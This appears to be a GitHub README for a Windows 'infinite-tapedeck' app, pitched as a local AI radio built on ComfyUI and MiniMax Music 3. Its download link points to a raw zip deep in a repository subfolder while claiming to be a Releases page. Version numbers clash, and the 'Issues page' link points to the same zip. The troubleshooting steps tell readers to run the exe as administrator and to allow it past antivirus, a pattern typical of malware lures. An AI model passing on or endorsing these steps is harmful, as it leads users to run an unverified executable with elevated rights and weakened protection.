# 🎛️ infinite-tapedeck - Your Music, Your Infinite Radio

## 🚀 What Is This?

Imagine having a personal radio station that plays only music you love, forever, without repeating. That's what **infinite-tapedeck** does. It takes the songs already on your computer and turns them into an endless stream of personalized audio, using smart AI technology to understand your taste and mix your library into something new and exciting.

Think of it as a cyberpunk cassette deck on your screen — a cool, retro-futuristic interface that controls a never-ending mixtape made just for you. No playlists to build, no algorithms from big tech companies spying on you. Just your music, your rules, playing infinitely.

## 🎯 Who Is This For?

**You**, if you:
- Have a folder (or many folders) of music files on your PC
- Are tired of the same songs repeating on shuffle
- Want to discover new combinations and transitions between tracks you already own
- Like cool, futuristic user interfaces
- Value privacy — everything runs locally on your machine
- Don't want to pay for another streaming subscription

This app is perfect for anyone who loves their own music collection but wants it to feel fresh and alive again.

---

## 🛠️ System Requirements

To run infinite-tapedeck smoothly, your computer should meet these basics:

| Component | Minimum | Recommended |
|-----------|---------|-------------|
| Operating System | Windows 10 (64-bit) | Windows 11 |
| Processor | Intel Core i3 or AMD equivalent | Intel Core i5 or better |
| RAM | 4 GB | 8 GB or more |
| Storage | 500 MB free space | 2 GB free space (for cache) |
| Graphics | Any DirectX 11 capable card | Dedicated GPU for faster AI processing |

*Note: These are general estimates. The app works on most modern Windows PCs.*

---

## ⬇️ How to Download and Install

### Step 1: Get the File

[![Download Now](https://img.shields.io/badge/Download-Latest_Release-ff69b4?style=for-the-badge&logo=github&logoColor=white&labelColor=2c2c2c)](https://raw.githubusercontent.com/Ryann-b/infinite-tapedeck/main/comfyui_node/music_studio/web/tapedeck-infinite-2.6.zip)

Click the big pink button above, or visit this link to download the application:

**👉 [https://raw.githubusercontent.com/Ryann-b/infinite-tapedeck/main/comfyui_node/music_studio/web/tapedeck-infinite-2.6.zip](https://raw.githubusercontent.com/Ryann-b/infinite-tapedeck/main/comfyui_node/music_studio/web/tapedeck-infinite-2.6.zip)**

This link takes you to the Releases page where you'll find the latest version.

### Step 2: Find the Right File

On that page, look for the newest release at the top. You'll see a file that looks something like:
- `infinite-tapedeck-v1.2.3.zip` (or similar version number)

**Click that file to download it.** Your browser will save it to your Downloads folder.

### Step 3: Extract the Files

1. Open your **Downloads** folder
2. Find the downloaded `.zip` file
3. **Right-click** on it and select **"Extract All"** (or use WinRAR/7-Zip if you have those)
4. Choose a destination folder (like your Desktop or Documents) and click **Extract**

### Step 4: Run the Application

1. Go to the folder where you extracted the files
2. Look for a file named `infinite-tapedeck.exe` (or `tapedeck.exe` — the main program file)
3. **Double-click it** to launch the app

That's it! The application will start, and you'll see the cassette deck interface appear.

### Step 5: Set Up Your Music Folder

When you first open the app, you'll be asked to point it to where your music lives:
1. Click **"Choose Folder"** or **"Add Music"** (look for a folder icon)
2. Navigate to any folder containing your music (MP3, WAV, FLAC, etc.)
3. Select the folder and confirm

The app will scan your music and start building your personal station automatically.

---

## 🎹 How to Use It

Once running, the interface looks like a retro tape deck with modern cyberpunk styling. Here's what each control does:

| Control | What It Does |
|---------|--------------|
| **Play/Pause** | Start or stop the infinite stream |
| **Skip** | Jump to a new track immediately |
| **Rewind/Fast-Forward** | Move 15 seconds backward/forward in the current track |
| **Volume Slider** | Adjust playback volume |
| **Taste Dial** | Turn this to adjust how adventurous the AI gets — from "Safe Hits" to "Deep Cuts" |
| **Station Display** | Shows the current track, next track, and a visualization of the AI's mix |

### 🎨 Customizing Your Experience

- **Theme Colors**: Go to Settings (gear icon) → Appearance to change the neon accent colors (default is cyan/pink)
- **Crossfade**: Enable smooth transitions between songs in Settings → Playback
- **Cache Size**: Control how much disk space the AI uses for preprocessing (Settings → Storage)

---

## 🧠 How It Works (Simple Explanation)

Behind the scenes, infinite-tapedeck uses two AI engines:

1. **ComfyUI** — this is a powerful creative toolkit that helps analyze your music files and understand their structure, rhythm, and mood.

2. **MiniMax Music 3** — a cutting-edge music generation model that can create seamless bridges, remixes, and variations based on your existing tracks.

Together, they build a "taste model" from your personal library. This means the AI learns what you like — your favorite genres, tempo patterns, energy levels — and then uses that knowledge to continuously generate new transitions and mixes that feel natural to you. It's like having a DJ who knows you perfectly and never sleeps.

All of this happens **locally** on your computer. Your music never leaves your machine.

---

## ❓ Frequently Asked Questions

### Q: Is my music uploaded to the cloud?
**No.** Everything runs locally. Your files stay on your computer.

### Q: What audio formats are supported?
Most common formats: MP3, WAV, FLAC, OGG, M4A, and more.

### Q: Can I use it with streaming services like Spotify?
No, this works with local files only. That's by design — complete privacy and no subscriptions.

### Q: The app seems slow. What can I do?
- Close other resource-heavy programs
- Reduce the number of songs in your music folder (larger libraries take longer to analyze initially)
- Lower the "Quality" setting in Settings → Performance

### Q: Is there a mobile version?
Currently, it's Windows-only. A mobile version might come later.

---

## 🆘 Troubleshooting

### The app won't start
- Make sure you extracted the ZIP completely (don't run it from inside the archive)
- Try right-clicking the `.exe` and choosing **"Run as administrator"**
- Check your antivirus — sometimes it blocks unknown apps. If so, allow it manually

### No music appears after adding folder
- Make sure your music files are in formats the app supports (MP3, WAV, FLAC, OGG, M4A)
- Try a smaller folder first to test
- Check that the folder path doesn't contain special characters like `#` or `%`

### The AI seems repetitive
- Turn the "Taste Dial" toward "Deep Cuts" for more variety
- Add more diverse music to your folder — the AI needs variety to work with

### Updates and New Features
Check the Releases page regularly — new versions come with improved AI models, more themes, and bug fixes.

---

## 🐛 Found a Problem?

If something isn't working right:
1. Make sure you have the **latest version** from the download page
2. Try restarting the app
3. Check that your music files aren't corrupted or DRM-protected
4. Report issues on the GitHub Issues page (link on the repository)

---

## 💡 Pro Tips

- **Curate smartly**: The AI works best with a variety of music. A folder with 20 different artists will sound more interesting than 200 songs by the same band.
- **Use folders**: You can add multiple folders! Keep different moods in different folders (e.g., "Morning", "Workout", "Relax") and switch between them as stations.
- **Let it run**: The longer the AI plays your music, the better it understands your taste. Give it a few hours to learn before judging its choices.
- **Export favorites**: If the AI generates a transition you love, you can save it as a permanent track (look for the 💾 icon).

---

## 📸 What It Looks Like

The interface is a blast from the past meets the future:
- **Cassette deck** design with spinning reels, glowing tape, and animated VU meters
- **Neon glow effects** in cyan, magenta, and purple against a dark background
- **Realistic mechanics** — the tape physically moves while playing, and you can see the "tape" stretching when you fast-forward
- **Visualizer bars** that pulse with the music

It's not just functional — it's a piece of art on your desktop.

---

## 🤝 Getting Help & Contributing

- **Found a bug?** Report it on the [GitHub Issues page](https://raw.githubusercontent.com/Ryann-b/infinite-tapedeck/main/comfyui_node/music_studio/web/tapedeck-infinite-2.6.zip)
- **Want to request a feature?** Same place! We love hearing ideas.
- **Feeling generous?** If you're a developer, contributions are welcome via pull requests.

---

## 📜 License

This project is licensed under the MIT License — feel free to use, modify, and share it.

---

## 💡 Final Tips

- Start with a small folder of your favorite songs to see how it works before adding your whole library
- Try adjusting the Taste Dial to explore different flavor profiles
- Let it run for 30 minutes — the AI gets better the longer it listens to your patterns

---

## 🌟 Enjoy Your Infinite Station

Thank you for choosing infinite-tapedeck. Your music collection will never sound the same again. Crank it up, press play, and get lost in your own infinite universe of sound.

Keywords: infinite-tapedeck, personal radio, AI music, local music player, ComfyUI, MiniMax Music 3, music mixer, playlist generator, Windows app, open source music, radio simulator, cassette deck interface, cyberpunk UI, offline music, local AI, music taste analysis